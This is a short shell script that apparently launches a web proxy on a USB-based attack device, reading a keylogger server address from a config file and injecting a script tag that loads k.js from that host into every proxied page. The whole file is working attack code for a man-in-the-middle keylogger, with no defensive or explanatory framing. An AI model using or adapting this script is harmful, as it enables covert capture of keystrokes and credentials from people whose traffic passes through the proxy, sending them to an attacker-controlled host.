#!/bin/sh

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usb/lib:/usb/usr/lib
export PATH=$PATH:/usb/usr/bin:/usb/usr/sbin

MYPATH="$(dirname $0)/"
KEYLOGGERIP=`cat ${MYPATH}keylogger.conf | grep "ip" | awk -F = '{print $2}'`
SCRIPT_INJECT="<script src='http://${KEYLOGGERIP}/k.js'></script>"

ruby -Kn proxy.rb --script-inject "${SCRIPT_INJECT}"
